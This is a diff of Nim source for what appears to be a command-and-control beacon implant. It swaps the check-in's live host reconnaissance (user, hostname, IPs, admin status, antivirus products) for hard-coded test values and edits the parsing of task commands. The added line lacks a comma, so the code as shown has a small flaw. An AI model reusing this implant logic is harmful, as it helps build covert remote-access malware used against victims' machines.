@@ -8,23 +8,24 @@ let client = newHttpClient()
 proc sendCheckin*(id: string): string =
     let checkin_payload = %*{
       "id": id, #agent's id
-      "user": getUserName(),
-      "hostname": getHostname(), #name of the host in whcih the agent is residing
-      "os_version": getOSVersion(),
-      "os_build": getOSBuild(),
-      "architecture": getArchitecture(),
-      "process_id": getProcessID(),
-      "process_name": getProcessName(),
-      "internal_ip": getInternalIP(),
-      "external_ip": getExternalIP(),
-      "domain": getDomain(),
-      "is_admin": isAdmin(),
-      "av_products": getAVProducts(),
-      "beacon_start_time":  beacon_start_time,
+      "user": "kali",
+      "hostname": "kali", #name of the host in whcih the agent is residing
+      "os_version": "1.2.3",
+      "os_build": "327.112.1",
+      "architecture": "x64",
+      "process_id": "12323",
+      "process_name": "beacon",
+      "internal_ip": "127.0.0.1",
+      "external_ip": "127.0.0.1",
+      "domain": "workgroup",
+      "is_admin": "no",
+      "av_products":"defender",
+      "beacon_start_time":  now(),
       "first_checkin": now(),
       "implant_version": IMPLANT_VERSION,
       "beacon_key": PER_BEACON_KEY,
       "timestamp": now() #like last seen or last activity
+      "status": "Active"
     }
 
     key : seq[byte]
@@ -54,8 +55,7 @@ type Task = object
     task_id: string
     command: string
 
-proc parseTask*(raw: string): Task =
-    let j = parseJson(raw)
+proc parseTask*(raw: JsonNode): Task =
     #j["task_id"]
-    result.task_id = j["task_id"].getStr()
-    result.command = j["commad"].getStr()
+    result.task_id = raw["task_id"].getStr()
+    result.command = raw["commad"].getStr()
